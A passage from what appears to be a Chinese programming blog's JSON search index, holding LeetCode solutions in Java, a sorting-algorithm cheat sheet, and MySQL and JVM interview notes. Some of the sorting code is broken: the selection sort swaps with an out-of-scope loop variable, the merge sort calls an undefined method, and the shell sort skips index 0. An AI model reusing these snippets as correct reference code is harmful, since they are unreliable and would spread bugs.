if(target &gt; nums[m] &amp;&amp; target &lt;= nums[r])&#123; l = m + 1; &#125;else&#123; r = m - 1; &#125; &#125; &#125; &#125; return -1; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"二分查找","slug":"二分查找","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"}]},{"title":"341.扁平化嵌套列表迭代器","slug":"341-扁平化嵌套列表迭代器","date":"2020-04-06T13:51:23.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/04/341-扁平化嵌套列表迭代器/","link":"","permalink":"https://virgilchen97.github.io/2020/04/341-%E6%89%81%E5%B9%B3%E5%8C%96%E5%B5%8C%E5%A5%97%E5%88%97%E8%A1%A8%E8%BF%AD%E4%BB%A3%E5%99%A8/","excerpt":"给你一个嵌套的整型列表。请你设计一个迭代器，使其能够遍历这个整型列表中的所有整数。 列表中的每一项或者为一个整数，或者是另一个列表。其中列表的元素也可能是整数或是其他列表。 12345示例 1:输入: [[1,1],2,[1,1]]输出: [1,1,2,1,1]解释: 通过重复调用 next 直到 hasNext 返回 false，next 返回的元素的顺序应该是: [1,1,2,1,1]。","text":"给你一个嵌套的整型列表。请你设计一个迭代器，使其能够遍历这个整型列表中的所有整数。 列表中的每一项或者为一个整数，或者是另一个列表。其中列表的元素也可能是整数或是其他列表。 12345示例 1:输入: [[1,1],2,[1,1]]输出: [1,1,2,1,1]解释: 通过重复调用 next 直到 hasNext 返回 false，next 返回的元素的顺序应该是: [1,1,2,1,1]。 解法 看到这种嵌套列表的题目，第一个想法就是使用栈。我们进行如下的操作： 初始化 新建一个栈，把输入的List中的元素全部加入栈 Next 如果栈顶的NestedInteger是一个Integer，弹出并返回。 如果栈顶的NestedInteger是一个List： 弹出栈顶元素，将栈顶List中的元素倒序加入栈 重复，直到栈顶元素不是List 弹出并返回栈顶元素 HashNext 本题中如果NestedInteger是一个List，这个List是可以为空的，例如有一个测试用例是 [[]]。 因此，我们不能简单地判断栈是否为空，而是应该执行类似于Next的操作，不同之处在于最后我们不弹出栈顶元素。 12345678910111213141516171819202122232425262728293031323334353637383940public class NestedIterator implements Iterator&lt;Integer&gt; &#123; Stack&lt;NestedInteger&gt; stack; public NestedIterator(List&lt;NestedInteger&gt; nestedList) &#123; stack = new Stack&lt;&gt;(); // 把List中的元素入栈 for(int i = nestedList.size() - 1; i&gt;=0; i--)&#123; stack.push(nestedList.get(i)); &#125; &#125; @Override public Integer next() &#123; // 如果栈顶不是Integer while(!stack.peek().isInteger())&#123; // 弹出栈顶元素 NestedInteger top = stack.pop(); List&lt;NestedInteger&gt; list = top.getList(); // 将栈顶元素List中的元素倒序放入栈 for(int i = list.size() - 1; i&gt;=0; i--)&#123; stack.push(list.get(i)); &#125; &#125; // 弹出栈顶元素并返回 return stack.pop().getInteger(); &#125; @Override public boolean hasNext() &#123; // 和Next相同的操作，最后不pop即可 while(!stack.isEmpty() &amp;&amp; !stack.peek().isInteger())&#123; NestedInteger top = stack.pop(); List&lt;NestedInteger&gt; list = top.getList(); for(int i = list.size() - 1; i&gt;=0; i--)&#123; stack.push(list.get(i)); &#125; &#125; return !stack.isEmpty(); &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"栈","slug":"栈","permalink":"https://virgilchen97.github.io/tags/%E6%A0%88/"}]},{"title":"373.查找和最小的K对数字","slug":"373-查找和最小的K对数字","date":"2020-04-05T15:47:55.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/04/373-查找和最小的K对数字/","link":"","permalink":"https://virgilchen97.github.io/2020/04/373-%E6%9F%A5%E6%89%BE%E5%92%8C%E6%9C%80%E5%B0%8F%E7%9A%84K%E5%AF%B9%E6%95%B0%E5%AD%97/","excerpt":"给定两个以升序排列的整形数组 nums1 和 nums2, 以及一个整数 k。 定义一对值 (u,v)，其中第一个元素来自 nums1，第二个元素来自 nums2。 找到和最小的 k 对数字 (u1,v1), (u2,v2) ... (uk,vk)。 123456示例:输入: nums1 = [1,7,11], nums2 = [2,4,6], k = 3输出: [1,2],[1,4],[1,6]解释: 返回序列中的前 3 对数： [1,2],[1,4],[1,6],[7,2],[7,4],[11,2],[7,6],[11,4],[11,6]","text":"给定两个以升序排列的整形数组 nums1 和 nums2, 以及一个整数 k。 定义一对值 (u,v)，其中第一个元素来自 nums1，第二个元素来自 nums2。 找到和最小的 k 对数字 (u1,v1), (u2,v2) ... (uk,vk)。 123456示例:输入: nums1 = [1,7,11], nums2 = [2,4,6], k = 3输出: [1,2],[1,4],[1,6]解释: 返回序列中的前 3 对数： [1,2],[1,4],[1,6],[7,2],[7,4],[11,2],[7,6],[11,4],[11,6] 解法 暴力使用大顶堆 对于再某集合中寻找前K小的元素，我们都知道可以使用大小为k的大顶堆，依次遍历集合中的各个元素： 若堆未满，则将元素放入堆 若堆已满： 如果遍历到的元素比堆顶大，则跳过 如果比堆顶小，则移除堆顶，将当前元素加入堆 最后队中所剩的K个元素即为我们所要找的前K小的元素。 对于本题，我们可以将两个数组所能组成的所有数对作为集合，使用以上方法找出最小的K个元素： 12345678910111213141516171819202122232425262728293031323334class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; kSmallestPairs(int[] nums1, int[] nums2, int k) &#123; // 大顶堆，比较器使用lambda表达式，更简洁 PriorityQueue&lt;List&lt;Integer&gt;&gt; queue = new PriorityQueue&lt;&gt;(k, (o1, o2)-&gt;&#123; return (o2.get(0) + o2.get(1)) - (o1.get(0) + o1.get(1)); &#125;); // 遍历所有可能的集合 for(int i = 0; i &lt; Math.min(nums1.length, k); i++)&#123; for(int j = 0; j &lt; Math.min(nums2.length, k); j++)&#123; // 剪枝，如果当前的两个数之和超过了堆顶元素，由于数组已经排序，后面的元素只会更大，因此无需继续遍历 if(queue.size() == k &amp;&amp; nums1[i]+nums2[j] &gt; queue.peek().get(0) + queue.peek().get(1))&#123; break; &#125; // 若比堆顶小，则弹出堆顶元素，把当前数对加入 if(queue.size() == k)&#123; queue.poll(); &#125; List&lt;Integer&gt; pair = new ArrayList&lt;&gt;(); pair.add(nums1[i]); pair.add(nums2[j]); queue.add(pair); &#125; &#125; // 最后将元素弹出，倒序插入数组即可 List&lt;List&lt;Integer&gt;&gt; res = new LinkedList&lt;&gt;(); for(int i =0; i &lt; k &amp;&amp; !queue.isEmpty(); i++)&#123; res.add(0, queue.poll()); &#125; return res; &#125;&#125; 使用小顶堆 这个想法借鉴了 23.合并K个排序链表。 举个例子，示例中给出的数组是： 12nums1 = [1,7,11]nums2 = [2,4,6] 我们把这个问题转换为合并K个有序数组，则我们可以把数组转换为： 123(1,2)-&gt;(1,4)-&gt;(1,6)(7,2)-&gt;(7,4)-&gt;(7,6)(11,2)-&gt;(11,4)-&gt;(11,6) 在合并K个有序数组中我们是如何做的的呢？ 把每个数组的第一个元素加入小顶堆 弹出小顶堆的堆顶元素 弹出的元素来自哪个数组，就把那个数组的下一个元素加入小顶堆 重复2，直到所有数组都没有下一个元素 本题中我们只需要弹出K次，即可获取前K小的元素 1234567891011121314151617181920212223242526272829303132333435class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; kSmallestPairs(int[] nums1, int[] nums2, int k) &#123; // 小顶堆 PriorityQueue&lt;int[]&gt; queue = new PriorityQueue&lt;&gt;( (o1, o2) -&gt; (nums1[o1[0]] + nums2[o1[1]]) - (nums1[o2[0]] + nums2[o2[1]])); List&lt;List&lt;Integer&gt;&gt; res = new LinkedList&lt;&gt;(); // 两个数组有一个为空，返回空 if(nums1.length==0 || nums2.length == 0)&#123; return res; &#125; // 将我们假想的每个数组的第一项加入小顶堆 for (int i = 0; i &lt; Math.min(nums1.length, k); i++) &#123; queue.add(new int[] &#123; i, 0 &#125;); // 加入的是坐标，小顶堆的比较器也是基于坐标比较 &#125; // 循环K次或者堆空 while (k &gt; 0 &amp;&amp; !queue.isEmpty()) &#123; // 弹出堆顶元素 int[] pair = queue.poll(); List&lt;Integer&gt; item = new ArrayList&lt;&gt;(); item.add(nums1[pair[0]]); item.add(nums2[pair[1]]); // 若我们假想的数组有下一个元素，则加入小顶堆 if (pair[1] &lt; nums2.length - 1) &#123; queue.add(new int[] &#123; pair[0], pair[1] + 1 &#125;); &#125; res.add(item); k--; &#125; return res; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"最小堆","slug":"最小堆","permalink":"https://virgilchen97.github.io/tags/%E6%9C%80%E5%B0%8F%E5%A0%86/"}]},{"title":"698-划分为k个相等的子集","slug":"698-划分为k个相等的子集","date":"2020-04-04T10:14:08.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/04/698-划分为k个相等的子集/","link":"","permalink":"https://virgilchen97.github.io/2020/04/698-%E5%88%92%E5%88%86%E4%B8%BAk%E4%B8%AA%E7%9B%B8%E7%AD%89%E7%9A%84%E5%AD%90%E9%9B%86/","excerpt":"给定一个整数数组 nums 和一个正整数 k，找出是否有可能把这个数组分成 k 个非空子集，其总和都相等。 示例 1： 123输入： nums = [4, 3, 2, 3, 5, 2, 1], k = 4输出： True说明： 有可能将其分成 4 个子集（5），（1,4），（2,3），（2,3）等于总和。 注意: 1 &lt;= k &lt;= len(nums) &lt;= 16 0 &lt; nums[i] &lt; 10000","text":"给定一个整数数组 nums 和一个正整数 k，找出是否有可能把这个数组分成 k 个非空子集，其总和都相等。 示例 1： 123输入： nums = [4, 3, 2, 3, 5, 2, 1], k = 4输出： True说明： 有可能将其分成 4 个子集（5），（1,4），（2,3），（2,3）等于总和。 注意: 1 &lt;= k &lt;= len(nums) &lt;= 16 0 &lt; nums[i] &lt; 10000 解法 DFS + 剪枝 这题我们注意到题目中给定了条件1 &lt;= k &lt;= len(nums) &lt;= 16， 因此我们使用DFS不会爆栈，但是如果不做任何优化的话任然会超时。 大体思路是，首先我们通过对所有数取平均值来获得每一个子集的和的Target，接下来创建k个桶，使用DFS向桶中放入数字，如果数字恰好放完了并且每一个桶中的值都为target，那么返回True。具体的优化请看代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Solution &#123; int[] bucket; // public boolean canPartitionKSubsets(int[] nums, int k) &#123; // 对数组进行排序，非必须，但是会避免许多不必要的计算 Arrays.sort(nums); // 如果 k 为 1 直接返回 True if (k == 1) return true; // 求和取平均值，平均值即为每个桶的Target int sum = 0; for (int num : nums) &#123; sum += num; &#125; // 平均值不为整数的话一定不可能 if (sum % k != 0)&#123; return false; &#125; // 把每个桶设为target，运算的时候倒扣 bucket = new int[k]; Arrays.fill(bucket, sum/k); return dfs(k, nums, nums.length - 1); &#125; public boolean dfs(int k, int[] nums, int cur) &#123; // cur代表当前我们正在操作的数，我们要决定把cur处的数放进哪个桶中，如果cur&lt;0代表所有数都放好了 if (cur &lt; 0) &#123; return true; &#125; // 遍历k个桶，放入cur for (int i = 0; i &lt; k; i++) &#123; // 剪枝，分两种情况，如果 nums[cur] 恰好能放入桶，则放下一个数 // 或者把当前数放入后，桶中的剩余空间还能够放得下nums中的某一数，则放入下一个数 // 由于数组经过排序，因此nums[0]为数组中最小的数，如果剩余空间比nums[0]小，那么数组中不存在能够补满这个桶的数了，剪枝。 if (bucket[i] == nums[cur] || bucket[i] - nums[cur] &gt;= nums[0]) &#123; bucket[i] -= nums[cur]; if (dfs(k, nums, cur - 1)) &#123; return true; &#125; bucket[i] += nums[cur]; &#125; &#125; return false; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"DFS","slug":"DFS","permalink":"https://virgilchen97.github.io/tags/DFS/"},{"name":"剪枝","slug":"剪枝","permalink":"https://virgilchen97.github.io/tags/%E5%89%AA%E6%9E%9D/"}]},{"title":"排序算法速查","slug":"排序算法速查","date":"2020-04-01T10:37:47.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/04/排序算法速查/","link":"","permalink":"https://virgilchen97.github.io/2020/04/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E9%80%9F%E6%9F%A5/","excerpt":"记录一下常见的排序算法，想不起来的时候可以快速查询","text":"记录一下常见的排序算法，想不起来的时候可以快速查询 选择排序 找到数组中最小的元素，放到第一位，在身下的元素中继续找最小的元素，放到第二位，以此类推。 12345678910111213141516public class SelectSort &#123; public static int[] selectSort(int[] a) &#123; int n = a.length; for (int i = 0; i &lt; n - 1; i++) &#123; int min = i; for (int j = i + 1; j &lt; n; j++) &#123; if(a[min] &gt; a[j]) min = j; &#125; //交换 int temp = a[i]; a[i] = a[j]; a[j] = temp; &#125; return a; &#125;&#125; 时间复杂度O(n^2) 空间复杂度O(1) 不稳定 插入排序 从数组第二个开始抽取元素，如果比第一个元素大则放在右边，否则放在左边，在找下一个元素，始终把新元素有序的插入到已经有序的前部中。 1234567891011121314151617181920public class InsertSort &#123; public static int[] insertSort(int[] arr) &#123; if(arr == null || arr.length &lt; 2) return arr; int n = arr.length; for (int i = 1; i &lt; n; i++) &#123; int temp = arr[i]; int k = i - 1; while(k &gt;= 0 &amp;&amp; arr[k] &gt; temp) k--; //腾出位置插进去,要插的位置是 k + 1; for(int j = i ; j &gt; k + 1; j--) arr[j] = arr[j-1]; //插进去 arr[k+1] = temp; &#125; return arr; &#125;&#125; 时间复杂度O(n^2) 空间复杂度O(1) 稳定 希尔排序 插入排序的改进，插入排序中如果最大的元素在第一位，那么需要n-1次移动才能将其挪动到结尾。 希尔排序允许我们交换不相邻的元素，让数组中间隔为H的元素有序，不断缩小h，最终数组整体有序。 12345678910111213141516171819202122232425262728public class ShellSort &#123; public static int[] shellSort(int arr[]) &#123; if (arr == null || arr.length &lt; 2) return arr; int n = arr.length; // 对每组间隔为 h的分组进行排序，刚开始 h = n / 2; for (int h = n / 2; h &gt; 0; h /= 2) &#123; //对各个局部分组进行插入排序 for (int i = h; i &lt; n; i++) &#123; // 将arr[i] 插入到所在分组的正确位置上 insertI(arr, h, i); &#125; &#125; return arr; &#125; /** * 将arr[i]插入到所在分组的正确位置上 * arr[i]] 所在的分组为 ... arr[i-2*h],arr[i-h], arr[i+h] ... */ private static void insertI(int[] arr, int h, int i) &#123; int temp = arr[i]; int k; for (k = i - h; k &gt; 0 &amp;&amp; temp &lt; arr[k]; k -= h) &#123; arr[k + h] = arr[k]; &#125; arr[k + h] = temp; &#125;&#125; 时间复杂度O(nlogn) 空间复杂度O(1) 不稳定 归并排序 通过递归的方式将大数组分割，再两两有序合并 12345678910111213141516171819202122232425262728293031323334353637383940public class MergeSort &#123; // 归并排序 public static int[] mergeSort(int[] arr, int left, int right) &#123; // 如果 left == right，表示数组只有一个元素，则不用递归排序 if (left &lt; right) &#123; // 把大的数组分隔成两个数组 int mid = (left + right) / 2; // 对左半部分进行排序 arr = sort(arr, left, mid); // 对右半部分进行排序 arr = sort(arr, mid + 1, right); //进行合并 merge(arr, left, mid, right); &#125; return arr; &#125; // 合并函数，把两个有序的数组合并起来 // arr[left..mif]表示一个数组，arr[mid+1 .. right]表示一个数组 private static void merge(int[] arr, int left, int mid, int right) &#123; //先用一个临时数组把他们合并汇总起来 int[] a = new int[right - left + 1]; int i = left; int j = mid + 1; int k = 0; while (i &lt;= mid &amp;&amp; j &lt;= right) &#123; if (arr[i] &lt; arr[j]) &#123; a[k++] = arr[i++]; &#125; else &#123; a[k++] = arr[j++]; &#125; &#125; while(i &lt;= mid) a[k++] = arr[i++]; while(j &lt;= right) a[k++] = arr[j++]; // 把临时数组复制到原数组 for (i = 0; i &lt; k; i++) &#123; arr[left++] = a[i]; &#125; &#125;&#125; 时间复杂度O(nlogn) 空间复杂度O(n) 稳定 快速排序 选取一个中轴元素，小的放左边大的放右边，递归进行 1234567891011121314151617181920212223242526272829303132333435public class QuickSort &#123; public static int[] quickSort(int[] arr, int left, int right) &#123; if (left &lt; right) &#123; //获取中轴元素所处的位置 int mid = partition(arr, left, right); //进行分割 arr = quickSort(arr, left, mid - 1); arr = quickSort(arr, mid + 1, right); &#125; return arr; &#125; private static int partition(int[] arr, int left, int right) &#123; //选取中轴元素 int pivot = arr[left]; int i = left + 1; int j = right; while (true) &#123; // 向右找到第一个小于等于 pivot 的元素位置 while (i &lt;= j &amp;&amp; arr[i] &lt;= pivot) i++; // 向左找到第一个大于等于 pivot 的元素位置 while(i &lt;= j &amp;&amp; arr[j] &gt;= pivot ) j--; if(i &gt;= j) break; //交换两个元素的位置，使得左边的元素不大于pivot,右边的不小于pivot int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; arr[left] = arr[j]; // 使中轴元素处于有序的位置 arr[j] = pivot; return j; &#125;&#125; 时间复杂度O(nlogn) 空间复杂度O(logn) 不稳定 堆排序 维护小顶堆，堆顶元素与最后一个元素交换并隔离，重新调整为小顶堆。 平均性能不如快排的原因：实际运行过程中，由于堆排需要交换堆顶元素和堆底元素，更加容易造成cache miss，因此综合效率不如快排。 时间复杂度O(nlogn) 空间复杂度O(1) 不稳定","categories":[{"name":"面试","slug":"面试","permalink":"https://virgilchen97.github.io/categories/%E9%9D%A2%E8%AF%95/"}],"tags":[{"name":"排序","slug":"排序","permalink":"https://virgilchen97.github.io/tags/%E6%8E%92%E5%BA%8F/"}]},{"title":"数据库知识点整理","slug":"数据库知识点整理","date":"2020-04-01T04:54:02.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/04/数据库知识点整理/","link":"","permalink":"https://virgilchen97.github.io/2020/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/","excerpt":"记录在数据库面试中常见的问题","text":"记录在数据库面试中常见的问题 Mysql 事务 数据库的事务是指一组sql语句组成的数据库逻辑处理单元，在这组的sql操作中，要么全部执行成功，要么全部执行失败。例如银行转账，包括了从账户 A 扣款和给账户 B 加钱的两个操作，这两个操作要么全部完成，要么全部失败。 ACID 简介 (A)tomicity, 原子性是指事务的原子性操作，对数据的修改要么全部执行成功，要么全部失败，实现事务的原子性，是基于日志的 Redo/Undo 机制。 ©onsistency，一致性指的是在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设约束、触发器、级联回滚等。 (I)solation，数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。这和数据库的事务隔离级别有关。 (D)urability，事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。 Undo/Redo 机制 Redo Redo log用来记录某数据块被修改后的值，可以用来恢复未写入 data file 的已成功事务更新的数据。主要用作数据库的崩溃恢复。MySql 官方文档中介绍 redo log 是一种记录在磁盘上的数据结构，它在错误恢复中被用于纠正未完成的事务产生的错误数据。 组成 Redo log 分为两个部分： 内存中的 redo log buffer，易失 磁盘上的 redo log file，持久 什么时候写 Redo log Innodb 通过 “Force log at commit” 来实现事务的持久性，也就是事务提交的时候必须把该事务的所有事务日志写入到磁盘上的redo log file和undo log file中进行持久化。 在数据页修改完成之后，在脏页刷出磁盘之前，写入redo日志。注意的是先修改数据，后写日志 redo日志比数据页先写回磁盘 聚集索引、二级索引、undo页面的修改，均需要记录Redo日志。 Undo Undo log是用来记录数据更新前的值，保证数据更新失败能够回滚。同时系统崩溃时，可能有些事务还没有COMMIT，在系统恢复时，这些没有COMMIT的事务就需要借助undo log来进行回滚。 什么时候写 Undo log 修改某一记录前写undo log到缓存 提交前将将undo log写到磁盘 实际流程 假设有A、B两个数据，值分别为1,2，开始一个事务，事务的操作内容为：把1修改为3，2修改为4，那么实际的记录如下（简化）： 事务开始. 记录A=1到undo log. 修改A=3. 记录A=3到redo log. 记录B=2到undo log. 修改B=4. 记录B=4到redo log. 将redo log写入磁盘 事务提交 数据库事务隔离级别 1. Read Uncommitted 在一个事务中可以读取到其他事务中没有commit的数据，所有隔离级别最低的一种。会产生脏读，如果这个时候事务由于某种原因被撤销，其他人可能读取到本不应该出现在数据库中的数据。 2. Read Committed 一个事务只能读取到其他事务提交以后的数据 但是会出现不可重复读问题，即事务A读取了数据，但是此时事务B更新了数据并提交了事务，当事务A读取该数据时数据发生了改变。 3. Repeatable 在同一个事务中，查询结果必须保持一致，即在事务A中读取了某一数据，那么在事务A没有结束之前，其他事务不能修改此数据。 但是会出现幻读问题，是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。 4. Serializable 最严格的事务隔离，要求事务必须序列化执行 MySql 锁机制（InnoDB） 总的来说，InnoDB 共有七种类型的锁： 共享/排它锁(Shared and Exclusive Locks) 意向锁(Intention Locks) 记录锁(Record Locks) 间隙锁(Gap Locks) 临键锁(Next-key Locks) 插入意向锁(Insert Intention Locks) 自增锁(Auto-inc Locks) 乐观锁和悲观锁 乐观锁（多读） 总是假设最好的情况，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号机制和CAS算法实现。乐观锁适用于多读的应用类型，这样可以提高吞吐量，像数据库提供的类似于write_condition机制. 悲观锁（多写） 总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它拿到锁（共享资源每次只给一个线程使用，其它线程阻塞，用完后再把资源转让给其它线程）。传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。Java中synchronized和ReentrantLock等独占锁就是悲观锁思想的实现。 共享/排它锁 （行锁） InnoDB 默认使用行锁，默认有两种种类的锁： 共享锁（S）：多个事务可以在同一行上共享锁，但是都只能获取数据但是不能修改 1SELECT ... LOCK IN SHARE MODE; 排他锁（X）：当一个事务上了X锁，那么其他的事务就不能在改行上任何种类的锁 1SELECT ... FOR UPDATE; select 语句默认不会加任何锁，而insert，update，delete 操作则会自动加上排他锁。 InnoDB的行锁时通过给索引项加锁来实现的，这意味着只有通过索引条件检索数据，InnoDB才使用行锁，否则将使用表锁。不论是使用主键索引、唯一索引或普通索引，InnoDB 都会使用行锁来对数据加锁。 意向锁（表锁） InnoDB 中除了直接的表锁之外，还实现了一种意向锁，意向锁是一种不与行锁冲突的表锁。通常如果一个事务给表中的某一行上了排他锁，那么我们不能在表上加锁。我们如何判断这种锁的冲突呢？ 判断表是否已经被其他事务锁住 判断表中的每一行是否被行锁锁住 这就意味着我们需要遍历整张表才能知道是否有某一行被锁住了，因此就有了意向锁。一个事务想要获取某一行的行锁时，要先获取对应的意向锁。 意向共享锁（IS）：它预示着，事务正在或者有意向对表中的”某些行”加S锁。 意向排他锁（IX）：它预示着，事务正在或者有意向对表中的”某些行”加X锁。 来看一下各种锁之间的兼容情况： IS IX IS true true IX true true S X IS true false IX false false 这样就解决了判断是否有锁需要全表扫描的情况。假设事务 A 给表的某一行上了S锁，那么他首先需要在表上上一个IS锁。此时如果事务 B 想要给表上一个 S 锁，那么 B 只需要去检查表上的意向锁 IS，发现 S 与 IS兼容，成功拿到表锁。而如果事务 B 想要给表上一个 X 锁, IS 和 X不兼容，因此事务 B 阻塞，避免了全表扫描。 记录锁、间隙锁、临键锁 记录锁（Record Lock） 记录锁就是对某行进行加锁，防止该行被其他操作修改或删除。 间隙锁（Gap Lock） 为了在RR级别下解决幻读引入的机制，他会锁定索引之间的间隙（即不存在的元素），其他事务都不能进行修改。不能在当前事务操作的索引范围内插入新值则可以避免幻读的问题。 临键锁（next-key Lock） 是记录锁和间隙锁的结合，满足左开右闭原则 插入意向锁 插入意向锁是在插入一条记录行前，由 INSERT 操作产生的一种间隙锁。该锁用以表示插入意向，当多个事务在同一区间（gap）插入位置不同的多条数据时，事务之间不需要互相等待。假设存在两条值分别为 4 和 7 的记录，两个不同的事务分别试图插入值为 5 和 6 的两条记录，每个事务在获取插入行上独占的（排他）锁前，都会获取（4，7）之间的间隙锁，但是因为数据行之间并不冲突，所以两个事务之间并不会产生冲突（阻塞等待） MySQL 索引 索引分类 主键索引：即主索引，在主键上建立的索引，不允许重复，不允许空值 唯一索引：建立索引的列的值是唯一的，不允许重复，允许空值 普通索引：普通的索引，无限制 全文索引：用大文本对象的列构建的索引 组合索引：用多个列组合构建的索引，这多个列中的值不允许有空值 实现方式 Hash索引 只有memory（内存）存储引擎支持哈希索引，哈希索引用索引列的值计算该值的hashCode，然后在hashCode相应的位置存执该值所在行数据的物理位置，因为使用散列算法，因此访问速度非常快，但是一个值只能对应一个hashCode，而且是散列的分布方式，因此哈希索引不支持范围查找和排序的功能。 B+树索引 使用 B+ 树组织的索引 全文索引 针对较大的数据，生成全文索引非常的消耗时间和空间。对于文本的大对象，或者较大的CHAR类型的数据，如果使用普通索引，那么匹配文本前几个字符还是可行的，但是想要匹配文本中间的几个单词，那么就要使用LIKE %word%来匹配，这样需要很长的时间来处理，响应时间会大大增加，这种情况，就可使用时FULLTEXT索引了，在生成FULLTEXT索引时，会为文本生成一份单词的清单，在索引时及根据这个单词的清单来索引。 物理角度 聚集索引 聚簇索引的顺序就是数据的物理存储顺序。 一个表只能建立一个聚簇索引 索引的叶子节点就是数据节点 非聚集索引 索引顺序与数据物理排列顺序无关 一个表可以有多个非聚簇索引 叶子节点仍然是索引节点，存在二次查询问题（拿到主键后需要通过主键索引再查询一次） 什么时候会不能使用索引 负向查询 （not in） 前导模糊查询 不能对索引字段进行计算 复合索引只有查询第一列和全部才能使用索引 innoDB 和 MyISAM 区别 InnoDB 支持事务，MyISAM 不支持事务。这是 MySQL 将默认存储引擎从 MyISAM 变成 InnoDB 的重要原因之一 InnoDB 支持外键，而 MyISAM 不支持。对一个包含外键的 InnoDB 表转为 MYISAM 会失败； InnoDB 是聚集索引，MyISAM 是非聚集索引。聚簇索引的文件存放在主键索引的叶子节点上，因此 InnoDB 必须要有主键，通过主键索引效率很高。但是辅助索引需要两次查询，先查询到主键，然后再通过主键查询到数据。因此，主键不应该过大，因为主键太大，其他索引也都会很大。而 MyISAM 是非聚集索引，数据文件是分离的，索引保存的是数据文件的指针。主键索引和辅助索引是独立的。 InnoDB 不保存表的具体行数，执行 select count(*) from table 时需要全表扫描。而MyISAM 用一个变量保存了整个表的行数，执行上述语句时只需要读出该变量即可，速度很快 InnoDB 最小的锁粒度是行锁，MyISAM 最小的锁粒度是表锁。一个更新语句会锁住整张表，导致其他查询和更新都会被阻塞，因此并发访问受限。这也是 MySQL 将默认存储引擎从 MyISAM 变成 InnoDB 的重要原因之一； 数据库范式 1NF：强调的是列的原子性，即列不能够再分成其他几列。 2NF：表必须有主键，且必须完全依赖于主键 3NF：非主属性不能依赖与其他非主属性（传递依赖）","categories":[{"name":"面试","slug":"面试","permalink":"https://virgilchen97.github.io/categories/%E9%9D%A2%E8%AF%95/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://virgilchen97.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"Java面试速查","slug":"Java面试速查","date":"2020-04-01T03:33:46.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/04/Java面试速查/","link":"","permalink":"https://virgilchen97.github.io/2020/04/Java%E9%9D%A2%E8%AF%95%E9%80%9F%E6%9F%A5/","excerpt":"记录一下Java面试中经常遇到的知识点","text":"记录一下Java面试中经常遇到的知识点 JMM Java 内存区域： 所有线程共享的： 方法区，存放被虚拟机加载的类信息，常量，静态变量等 堆，存放对象实例，GC的主要工作区域 线程私有的： 程序计数器，当前执行的字节码行号 栈，局部变量，返回值，返回地址等 本地方法栈，不关心 JMM 概述 Java内存模型中规定所有变量都存储在主内存，主内存是共享内存区域，所有线程都可以访问，但线程对变量的操作(读取赋值等)必须在工作内存中进行，首先要将变量从主内存拷贝的自己的工作内存空间，然后对变量进行操作，操作完成后再将变量写回主内存，不能直接操作主内存中的变量，工作内存中存储着主内存中的变量副本拷贝。 JMM 的承诺 原子性 指令重排 (volatile) 可见性 (volatile) 有序性 内存溢出异常 OOM 造成内存溢出的主要原因有： Java堆溢出，创建了太多的对象，可以设置Java堆的大小，但是也需要排查内存泄漏 虚拟机栈或者本地方法栈溢出 栈深度过大：StackOverFlow 扩展栈时空间不足：OOM 运行时常量池溢出 方法区溢出，方法区用于存放Class的相关信息，如果运行时产生大量的类去填满方法区，就可能发生方法区的内存溢出。(Cglib) 本地内存溢出 Java 类加载器 流程 1. 加载 类加载过程的一个阶段：通过一个类的完全限定查找此类字节码文件，并利用字节码文件创建一个Class对象 2. 验证 目的在于确保Class文件的字节流中包含信息符合当前虚拟机要求，不会危害虚拟机自身安全。主要包括四种验证，文件格式验证，元数据验证，字节码验证，符号引用验证。 3. 准备 为类变量(即static修饰的字段变量)分配内存并且设置该类变量的初始值即0(如static int i=5;这里只将i初始化为0，至于5的值将在初始化时赋值)，这里不包含用final修饰的static，因为final在编译的时候就会分配了，注意这里不会为实例变量分配初始化，类变量会分配在方法区中，而实例变量是会随着对象一起分配到Java堆中。 4. 解析 主要将常量池中的符号引用替换为直接引用的过程。符号引用就是一组符号来描述目标，可以是任何字面量，而直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。有类或接口的解析，字段解析，类方法解析，接口方法解析 5. 初始化 类加载最后阶段，若该类具有超类，则对其进行初始化，执行静态初始化器和静态初始化成员变量 双亲委派模式 （java 1.2） 